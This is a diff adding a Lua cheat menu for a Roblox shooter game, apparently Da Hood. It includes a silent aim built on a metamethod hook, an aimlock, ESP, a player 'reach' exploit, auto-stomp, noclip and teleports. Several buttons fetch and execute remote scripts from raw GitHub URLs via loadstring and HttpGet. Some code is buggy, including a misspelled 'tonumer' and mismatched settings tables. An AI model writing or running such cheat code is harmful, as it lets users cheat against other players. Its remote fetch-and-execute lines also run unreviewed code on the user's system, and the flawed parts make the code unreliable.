+local Tab3 = Window:CreateTab("Avatar")
+local Tab4 = Window:CreateTab("Misc")
+local Tab6 = Window:CreateTab("Credits")
+local Tab7 = Window:CreateTab("Settings")
+
+local Section1 = Tab1:CreateSection("Aim Configuration")
+local Section2 = Tab1:CreateSection("Fov Configuration")
+local Section99 = Tab1:CreateSection("Esp Configuration")
+local Section12 = Tab1:CreateSection("Toggles")
+local Section5 = Tab2:CreateSection("Guns")
+local Section11 = Tab2:CreateSection("Places")
+local Section6 = Tab3:CreateSection("Avatar Modifiactions")
+local other2 = Tab3:CreateSection("Other")
+local Section7 = Tab3:CreateSection("Face Changer")
+local Section8 = Tab4:CreateSection("Miscelanious")
+local Section9 = Tab4:CreateSection("Fun Stuff")
+local section54 = Tab4:CreateSection("Auto Farm")
+local Section13 = Tab6:CreateSection("Credits")
+local Section10 = Tab6:CreateSection("Partners")
+local Section3 = Tab7:CreateSection("Menu")
+local Section4 = Tab7:CreateSection("Background")
+
+local PartnersLabel = Section10:CreateLabel("Supporting with creating project!")
+PartnersLabel:UpdateText("Supporting with creating project!")
+
+----------------------------------------------------------------
+-------------------------//  AIMING  -------------------------
+local SilentAimToggle = Section1:CreateToggle("Silent Aim", nil, function(bool)
+    SilentSettings.SilentAim = bool
+end)
+SilentAimToggle:AddToolTip("Enables Silentaim.")
+SilentAimToggle:CreateKeybind("", function()
+end)
+
+local PredictLagToggle = Section1:CreateToggle("Predict Lag", nil, function(bool)
+    SilentSettings.Prediction.Lag = bool
+end)
+PredictLagToggle:AddToolTip("Enables Predict Lag.")
+
+local FovCircleToggle = Section1:CreateToggle("FOV Circle", nil, function(bool)
+    Aiming.ShowFOV = bool
+end)
+FovCircleToggle:AddToolTip("Enables FOV Circle.")
+
+local VisibleCheckToggle = Section1:CreateToggle("Visible Check", nil, function(bool)
+    Aiming.VisibleCheck = bool
+end)
+VisibleCheckToggle:AddToolTip("Checks if target is visible.")
+
+local HitAirShootsToggle = Section1:CreateToggle("Hit Airshots", nil, function(bool)
+    Aiming.Airshots = true
+end)
+HitAirShootsToggle:AddToolTip("Hits Airshots.")
+
+local HitChanceSlider = Section2:CreateSlider("Silent Aim Hitchance", 0,400,nil,false, function(value)
+    DaHoodSettings.Prediction = tonumer("0." .. value)
+end)
+HitChanceSlider:AddToolTip("Customize hitchance.")
+
+local aimlocklabel = Section1:CreateLabel("Aimlock")
+
+-------------------------------
+-----// AIMING FUNCTION -----
+function Aiming.Check()
+    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
+        return false
+    end
+ 
+    local Character = Aiming.Character(Aiming.Selected)
+    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
+    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+ 
+    if (KOd or Grabbed) then
+        return false
+    end
+ 
+    return true
+end
+local __index
+__index = hookmetamethod(game, "__index", function(t, k)
+    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
+        local SelectedPart = Aiming.SelectedPart
+        if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
+            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+ 
+            return (k == "Hit" and Hit or SelectedPart)
+        end
+    end
+ 
+    return __index(t, k)
+end)
+ 
+local LMFAO = false
+ 
+UserInputService.InputBegan:Connect(function(Key, Is)
+    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Is then
+        LMFAO = true
+    end
+end)
+ 
+UserInputService.InputEnded:Connect(function(Key, Is)
+    if Key.UserInputType == Enum.UserInputType.MouseButton2 and not Is then
+        LMFAO = false
+    end
+end)
+-----------------------------------------------------------
+
+local aimlock = Section1:CreateButton("Enable Aimlock", function()
+    getgenv().AimPart = "HumanoidRootPart"
+    getgenv().AimlockKey = "q"
+    getgenv().AimRadius = 30
+    getgenv().ThirdPerson = true
+    getgenv().FirstPerson = true
+    getgenv().TeamCheck = false
+    getgenv().PredictMovement = true
+    getgenv().PredictionVelocity = 9
+    local L_27_, L_28_, L_29_, L_30_ =
+        game:GetService "Players",
+    game:GetService "UserInputService",
+    game:GetService "RunService",
+    game:GetService "StarterGui"
+    local L_31_, L_32_, L_33_, L_34_, L_35_, L_36_, L_37_ =
+        L_27_.LocalPlayer,
+    L_27_.LocalPlayer:GetMouse(),
+    workspace.CurrentCamera,
+    CFrame.new,
+    Ray.new,
+    Vector3.new,
+    Vector2.new
+    local L_38_, L_39_, L_40_ = true, false, false
+    local L_41_
+    getgenv().CiazwareUniversalAimbotLoaded = true
+    getgenv().WorldToViewportPoint = function(L_42_arg0)
+        return L_33_:WorldToViewportPoint(L_42_arg0)
+    end
+    getgenv().WorldToScreenPoint = function(L_43_arg0)
+        return L_33_.WorldToScreenPoint(L_33_, L_43_arg0)
+    end
+    getgenv().GetObscuringObjects = function(L_44_arg0)
+        if L_44_arg0 and L_44_arg0:FindFirstChild(getgenv().AimPart) and L_31_ and L_31_.Character:FindFirstChild("Head") then
+            local L_45_ = workspace:FindPartOnRay(L_35_(L_44_arg0[getgenv().AimPart].Position, L_31_.Character.Head.Position))
+            if L_45_ then
+                return L_45_:IsDescendantOf(L_44_arg0)
+            end
+        end
+    end
+    getgenv().GetNearestTarget = function()
+        local L_46_ = {}
+        local L_47_ = {}
+        local L_48_ = {}
+        for L_50_forvar0, L_51_forvar1 in pairs(L_27_:GetPlayers()) do
+            if L_51_forvar1 ~= L_31_ then
+                table.insert(L_46_, L_51_forvar1)
+            end
+        end
+        for L_52_forvar0, L_53_forvar1 in pairs(L_46_) do
+            if L_53_forvar1.Character ~= nil then
+                local L_54_ = L_53_forvar1.Character:FindFirstChild("Head")
+                if getgenv().TeamCheck == true and L_53_forvar1.Team ~= L_31_.Team then
+                    local L_55_ =
+                        (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                    local L_56_ =
+                        Ray.new(
+                            game.Workspace.CurrentCamera.CFrame.p,
+                            (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_55_
+                        )
+                    local L_57_, L_58_ = game.Workspace:FindPartOnRay(L_56_, game.Workspace)
+                    local L_59_ = math.floor((L_58_ - L_54_.Position).magnitude)
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_55_
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_59_
+                    table.insert(L_48_, L_59_)
+                elseif getgenv().TeamCheck == false and L_53_forvar1.Team == L_31_.Team then
+                    local L_60_ =
+                        (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                    local L_61_ =
+                        Ray.new(
+                            game.Workspace.CurrentCamera.CFrame.p,
+                            (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_60_
+                        )
+                    local L_62_, L_63_ = game.Workspace:FindPartOnRay(L_61_, game.Workspace)
+                    local L_64_ = math.floor((L_63_ - L_54_.Position).magnitude)
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_60_
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
+                    L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_64_
+                    table.insert(L_48_, L_64_)
+                end
+            end
+        end
+        if unpack(L_48_) == nil then
+            return nil
+        end
+        local L_49_ = math.floor(math.min(unpack(L_48_)))
+        if L_49_ > getgenv().AimRadius then
+            return nil
+        end
+        for L_65_forvar0, L_66_forvar1 in pairs(L_47_) do
+            if L_66_forvar1.diff == L_49_ then
+                return L_66_forvar1.plr
+            end
+        end
+        return nil
+    end
+    L_32_.KeyDown:Connect(
+        function(L_67_arg0)
+            if L_67_arg0 == AimlockKey and L_41_ == nil then
+                pcall(
+                    function()
+                        if L_39_ ~= true then
+                            L_39_ = true
+                        end
+                        local L_68_
+                        L_68_ = GetNearestTarget()
+                        if L_68_ ~= nil then
+                            L_41_ = L_68_
+                        end
+                    end
+                )
+            elseif L_67_arg0 == AimlockKey and L_41_ ~= nil then
+                if L_41_ ~= nil then
+                    L_41_ = nil
+                end
+                if L_39_ ~= false then
+                    L_39_ = false
+                end
+            end
+        end
+    )
+    L_29_.RenderStepped:Connect(
+        function()
+            if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
+                if
+                    (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 or
+                    (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1
+                then
+                    L_40_ = true
+                else
+                    L_40_ = false
+                end
+            elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
+                if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 then
+                    L_40_ = true
+                else
+                    L_40_ = false
+                end
+            elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
+                if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1 then
+                    L_40_ = true
+                else
+                    L_40_ = false
+                end
+            end
+            if L_38_ == true and L_39_ == true then
+                if L_41_ and L_41_.Character and L_41_.Character:FindFirstChild(getgenv().AimPart) then
+                    if getgenv().FirstPerson == true then
+                        if L_40_ == true then
+                            if getgenv().PredictMovement == true then
+                                L_33_.CFrame =
+                                    L_34_(
+                                        L_33_.CFrame.p,
+                                        L_41_.Character[getgenv().AimPart].Position +
+                                        L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
+                                    )
+                            elseif getgenv().PredictMovement == false then
+                                L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
+                            end
+                        end
+                    elseif getgenv().ThirdPerson == true then
+                        if L_40_ == true then
+                            if getgenv().PredictMovement == true then
+                                L_33_.CFrame =
+                                    L_34_(
+                                        L_33_.CFrame.p,
+                                        L_41_.Character[getgenv().AimPart].Position +
+                                        L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
+                                    )
+                            elseif getgenv().PredictMovement == false then
+                                L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    )
+end)
+aimlock:AddToolTip("Enables Aimlock [Q]")
+
+local aimlockprediction = Section1:CreateTextBox("Aimlock Prediction", "Prediction", true, 	function(L_70_arg0)
+    PredictionVelocity = L_70_arg0
+end)
+aimlockprediction:SetValue("9")
+aimlockprediction:AddToolTip("Changes Prediction.")
+
+local aimlockaimpart = Section1:CreateDropdown("Aimpart", {"Head","UpperTorso","HumanoidRootPart","LowerTorso"}, function(L_71_arg0)
+    getgenv().AimPart = L_71_arg0
+end)
+aimlockaimpart:SetOption("UpperTorso")
+aimlockaimpart:AddToolTip("Changes Aimpart.")
+--------------------------------------------------------------------
+-------------------------//  FOV CIRCLE  -------------------------
+
+local FovCircleSize = Section2:CreateSlider("Fov Circle Size", 0,400,nil,true, function(value)
+    Aiming.FOV = value
+end)
+FovCircleSize:AddToolTip("Customize Fov Circle Size.")
+
+local fovsides = Section2:CreateSlider("Fov Circle Sides", 0,40,nil,true, function(value)
+    Aiming.FOVSides  = value
+end)
+FovCircleSize:AddToolTip("Customize Fov Circle Sides.")
+
+local fovcolor = Section2:CreateColorpicker("Fov Color", function(color)
+	Aiming.FOVColour = color
+end)
+fovcolor:AddToolTip("Change FOV color.")
+fovcolor:UpdateColor(Color3.fromRGB(20, 124, 255))
+
+--------------------------------------------------------------
+-----------------------//  TOGGLES   -----------------------
+
+local AntiSlow = Section12:CreateToggle("Anti-Slow", nil, function(gh)
+    if gh == true then
+        game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
+            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
+            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
+            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
+            if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false end
+        end)
+    elseif gh == false then
+        game:GetService('RunService'):UnbindFromRenderStep("Anti-Slow")
+    end
+end)
+local Reach = Section12:CreateToggle("Reach", nil, function(e)
+    if e == true then
+        game:GetService('RunService'):BindToRenderStep("Reach", 0 , function()
+            local success, err = pcall(function()
+                if game.Players.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
+                    for i,v in pairs(game:GetService('Players'):GetChildren()) do
+                        if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
+                            if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
+                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
+                                    firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
+                                else
+                                    firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
+                                    firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
+                                    firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
+                                    firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
+                                    firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
+                                    firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end)
+    elseif e == false then
+        game:GetService('RunService'):UnbindFromRenderStep("Reach")
+    end
+end)
+--AntiSlow:CreateKeybind("", function()
+local AutoStomp = Section12:CreateToggle("Auto-Stomp", nil, function(r)
+    if r == true then
+        game:GetService('RunService'):BindToRenderStep("Auto-Stomp", 0 , function()
+            game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
+        end)
+    elseif r == false then
+        game:GetService('RunService'):UnbindFromRenderStep("Auto-Stomp")
+    end
+end)
+--AutoStomp:CreateKeybind("", function()
+local AntiStomp = Section12:CreateToggle("Anti-Stomp", nil, function(x)
+    if x == true then
+        game:GetService('RunService'):BindToRenderStep("Anti-Stomp", 0 , function()
+            if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA('MeshPart') or v:IsA('Part') then
+                        v:Destroy()
+                    end
+                end
+                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                    if v:IsA('Accessory') then
+                        v.Handle:Destroy()
+                    end
+                end
+            end
+        end)
+    elseif x == false then
+        game:GetService('RunService'):UnbindFromRenderStep("Anti-Stomp")
+    end
+end)
+--AntiStomp:CreateKeybind("", function()
+local AutoReload = Section12:CreateToggle("Auto-Reload", nil, function(r)
+    if r == true then
+        game:GetService('RunService'):BindToRenderStep("Auto-Reload", 0 , function()
+            if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
+                if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") then
+                    if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0 then
+                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) 
+                        wait(1)
+                    end
+                end
+            end
+        end)
+    elseif r == false then
+        game:GetService('RunService'):UnbindFromRenderStep("Auto-Reload")
+    end
+end)
+--AutoReload:CreateKeybind("", function()
+
+local Noclip = Section12:CreateButton("No Clip", function()
+local noclipplayer = game:GetService("Players").LocalPlayer
+local noclipmouse = noclipplayer:GetMouse()
+ 
+local donoclip = false
+local noclip = false
+ 
+function b_noclip(key)
+if (key == "b") then
+if noclip == false then
+donoclip = true
+ 
+noclip = true
+elseif noclip == true then
+donoclip = false
+ 
+noclip = false
+end
+end
+end
+ 
+noclipmouse.KeyDown:connect(b_noclip)
+ 
+game:GetService("Players").LocalPlayer.Character.Head.Touched:connect(function(obj)
+if obj ~= workspace.Terrain then
+if donoclip == true then
+obj.CanCollide = false
+else
+obj.CanCollide = true
+end
+end
+end)
+end)
+Noclip:AddToolTip("Enables Noclip [B].")
+
+
+local fly2 = Section12:CreateButton("Fly", function()
+    loadstring(Game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/fly.lua'))()
+end)
+fly2:AddToolTip("Enables fly [X]")
+
+local fovchanger = Section12:CreateSlider("Change Fov", 0,120,nil,true, function(value)
+    game:GetService'Workspace'.Camera.FieldOfView = value
+end)
+
+getgenv().SpinBotSpeed = 20
+
+local spinbot = Section12:CreateToggle("Spin Bot", nil, function(state)
+	function getRoot(char)
+				local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('UpperTorso')
+				return rootPart
+			end
+
+			if state == true then
+				local Spin = Instance.new("BodyAngularVelocity")
+				Spin.Name = "Spinning"
+				Spin.Parent = getRoot(game.Players.LocalPlayer.Character)
+				Spin.MaxTorque = Vector3.new(0, math.huge, 0)
+				Spin.AngularVelocity = Vector3.new(0,getgenv().SpinBotSpeed,0)
+			else
+				for i,v in pairs(getRoot(game.Players.LocalPlayer.Character):GetChildren()) do
+					if v.Name == "Spinning" then
+						v:Destroy()
+					end
+				end
+			end
+		end)
+spinbot:CreateKeybind("", function()
+end)
+spinbot:AddToolTip("Enables spinbot.")
+
+local spinbotspeed = Section12:CreateSlider("Spinbot Speed",20,50,nil,true, function(a)
+    getgenv().SpinBotSpeed = a
+end)
+spinbotspeed:SetValue(20)
+spinbotspeed:AddToolTip("Reset spinbot after changing.")
+--[[-------------------------------------------------------------------
+-------------------------//  OTHER MODS   ------------------------
+
+local reset = Section98:CreateButton("Reset Character", function(reset)
+    game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end)
+reset:AddToolTip("Resets your character")
+]]
+--------------------------------------------------------------------
+-----------------------------//  ESP   ---------------------------
+local espToggle = Section99:CreateToggle("Enable ESP", nil, function(bool)
+    ESP:Toggle(bool)
+end)
+espToggle:AddToolTip("Enables ESP.")
+espToggle:CreateKeybind("", function()
+end)
+
+local tracersToggle = Section99:CreateToggle("Enable Tracers", nil, function(bool)
+    ESP.Tracers = bool
+end)
+tracersToggle:AddToolTip("Enables Tracers.")
+
+local namesToggle = Section99:CreateToggle("Enable Names", nil, function(bool)
+    ESP.Names = bool
+end)
+namesToggle:AddToolTip("Enables Names.")
+
+local boxesToggle = Section99:CreateToggle("Enable Boxes", nil, function(bool)
+    ESP.Boxes = bool
+end)
+tracersToggle:AddToolTip("Enables Boxes.")
+
+local espcolor = Section99:CreateColorpicker("Esp Color", function(color)
+	ESP.Color = color
+end)
+espcolor:UpdateColor(Color3.fromRGB(20, 124, 255))
+espcolor:AddToolTip("Change ESP Color.")
+
+---------------------------------------------------------------------
+-------------------------//  AVATAR MODS   ------------------------
+
+local animationgamepass = Section6:CreateButton("Animation Gamepass", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/animation_gamepass.lua'))()
+end)
+animationgamepass:AddToolTip("Loads Animation Gamepass.")
+
+local animbutton = Section6:CreateButton("Animations", function(bool)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/anims.lua"))()
+end)
+animbutton:AddToolTip("Changes your animations.")
+
+local headlbutton = Section6:CreateButton("Headless", function(bool)
+game.Players.LocalPlayer.Character.Head.Transparency = 1
+for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+if (v:IsA("Decal")) then
+v:Destroy()
+end
+end
+end)
+headlbutton:AddToolTip("Makes you headless. [NOT FE]")
+
+local korbloxbutton = Section6:CreateButton("Korblox", function(bool)
+    local ply = game.Players.LocalPlayer
+    local chr = ply.Character
+    chr.RightLowerLeg.MeshId = "rbxassetid://902942093"
+    chr.RightLowerLeg.Transparency = "1"
+    chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+    chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+    chr.RightFoot.MeshId = "rbxassetid://902942089"
+    chr.RightFoot.Transparency = "1"
+end)
+korbloxbutton:AddToolTip("Gets you korblox [NOT FE]")
+
+local animatedbeastmode = Section6:CreateButton("Animated Beast Mode", function()
+	while true do
+local player = game.Players.LocalPlayer.Character
+if player:findFirstChild("Humanoid") then
+    player.Head.face.Texture = "https://www.roblox.com/asset/?id=209712379"
+    end
+wait(1)
+if player:findFirstChild("Humanoid") then
+    player.Head.face.Texture = "https://www.roblox.com/asset/?id=127959433"
+    end
+wait(1)
+end
+end)
+animatedbeastmode:AddToolTip("Makes your face animated.")
+
+---------------------------------------------------------------------
+--------------------------//  FACE MODS   -------------------------
+
+local meanie = Section7:CreateButton("Meanie", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/508490451.lua'))()
+end)
+meanie:AddToolTip("Changes your face to Meanie.")
+
+local sshf = Section7:CreateButton("Super Super Happy Face", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/494290547.lua'))()
+end)
+sshf:AddToolTip("Changes your face to Super Super Happy Face.")
+
+local silverpunk = Section7:CreateButton("Silver Punk Face", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/387256104.lua'))()
+end)
+silverpunk:AddToolTip("Changes your face to Silver Punk Face.")
+
+local yum = Section7:CreateButton("Yum", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/26018945.lua'))()
+end)
+yum:AddToolTip("Changes your face to Yum.")
+
+local playful = Section7:CreateButton("Playful Vampire", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/2409281591.lua'))()
+end)
+playful:AddToolTip("Changes your face to Playful Vampire.")
+
+local beastmode = Section7:CreateButton("Beast Mode", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/faces/127959433.lua'))()
+end)
+beastmode:AddToolTip("Changes your face to Beast Mode.")
+
+--------------------------------------------------------------------
+--------------------------//  TELEPORTS  -------------------------
+--------------------------    GUNS     //-------------------------
+--------------------------------------------------------------------
+local revolver = Section5:CreateButton("Revolver", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-638.75, 18.8500004, -118.175011, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+end)
+
+local ak = Section5:CreateButton("Ak", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-587.529358, 5.39480686, -753.717712, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+end)
+
+local smg = Section5:CreateButton("Smg", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-577.123413, 5.47666788, -718.031433, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+end)
+
+local ar = Section5:CreateButton("AR", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-591.824158, 5.46046877, -744.731628, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+end)
+
+local dbs = Section5:CreateButton("Double Barrel", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1039.59985, 18.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+end)
+
+local shotgun = Section5:CreateButton("Shotgun", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-578.623657, 5.47212696, -725.131531, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+end)
+
+local flame = Section5:CreateButton("Flame Thrower", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-157.122437, 50.9120102, -104.93145, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local tac = Section5:CreateButton("Tactical Shotgun", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(470.877533, 45.1272316, -620.630676, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local rpg = Section5:CreateButton("Rpg", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(118.664856, -29.6487694, -272.349792, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+end)
+
+local drumgun = Section5:CreateButton("Drum Gun", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-83.548996, 19.7020588, -82.1449585, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local armor = Section5:CreateButton("High Medium Armor", function(bool)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-939, -25, 571)
+end)
+
+local bat = Section5:CreateButton("Bat", function(bool)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(380, 49, -283)
+end)
+
+local mediumarmor = Section5:CreateButton("Medium Armor", function(bool)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(528, 50, -637)
+end)
+--------------------------------------------------------------------
+--------------------------//  TELEPORTS  -------------------------
+--------------------------   PLACES    //-------------------------
+--------------------------------------------------------------------
+local church = Section11:CreateButton("Church", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(147.299988, 18.8493252, 31.7999744, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+end)
+
+local admin1 = Section11:CreateButton("Admin Guns", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-872.853516, -34.4276848, -538.013306, -0.999724388, -3.9898886e-08, -0.0234765243, -3.9204977e-08, 1, -3.00177518e-08, 0.0234765243, -2.90890814e-08, -0.999724388)
+end)
+
+local admin2 = Section11:CreateButton("Admin Guns 2", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-808.708557, -39.6492004, -932.789368, 0.999899805, 2.01343173e-08, -0.0141554065, -2.17800533e-08, 1, -1.16108232e-07, 0.0141554065, 1.16404912e-07, 0.999899805)
+end)
+
+local admin3 = Section11:CreateButton("Admin Food", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-788.053406, -39.6492004, -932.951233, 0.998369277, 2.46515359e-08, 0.0570784509, -2.8773524e-08, 1, 7.13949646e-08, -0.0570784509, -7.29209759e-08, 0.998369277)
+end)
+
+local ufo = Section11:CreateButton("Ufo", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2.85052466, 132, -736.571106, -0.0460956171, -4.24733706e-08, -0.998937011, 7.26012459e-08, 1, -4.58687275e-08, 0.998937011, -7.46384217e-08, -0.0460956171)
+end)
+
+local casino = Section11:CreateButton("Casino", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-995, 21.6998043, -153.100037, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local bank = Section11:CreateButton("Bank", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-318.891174, 80.2145309, -257.177429, 0.0479469746, -5.14644114e-08, 0.998850107, -3.12971538e-09, 1, 5.16738901e-08, -0.998850107, -5.60372015e-09, 0.0479469746)
+end)
+
+local taco = Section11:CreateButton("Taco", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(584.026855, 48.1605072, -474.033936, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local revRoof = Section11:CreateButton("Revolver Roof", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-634.463135, 80.434761, -204.232559, -0.0190527271, -1.03574322e-07, -0.999818563, 4.36709335e-09, 1, -1.03676342e-07, 0.999818563, -6.3416179e-09, -0.0190527271)
+end)
+
+local playground = Section11:CreateButton("PlayGround", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-282.694153, 19.7496624, -807.719727, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local gas = Section11:CreateButton("Gas Station", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(604.800415, 46.0998344, -258.249573, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+end)
+
+local cementery = Section11:CreateButton("Cementery", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.109558, 99.75, -57.2315979, 0.999993503, -0.000633752206, -0.0035054055, 0.000638642872, 0.999998808, 0.00139435288, 0.00350463158, -0.00139658386, 0.999992728)
+end)
+
+local school = Section11:CreateButton("School Roof", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-525.353455, 68.125, 311.824402, 0.999992013, 1.03866675e-08, -0.00399552286, -1.03507425e-08, 1, 9.01170427e-09, 0.00399552286, -8.97027519e-09, 0.999992013)
+end)
+
+--------------------------------------------------------------------
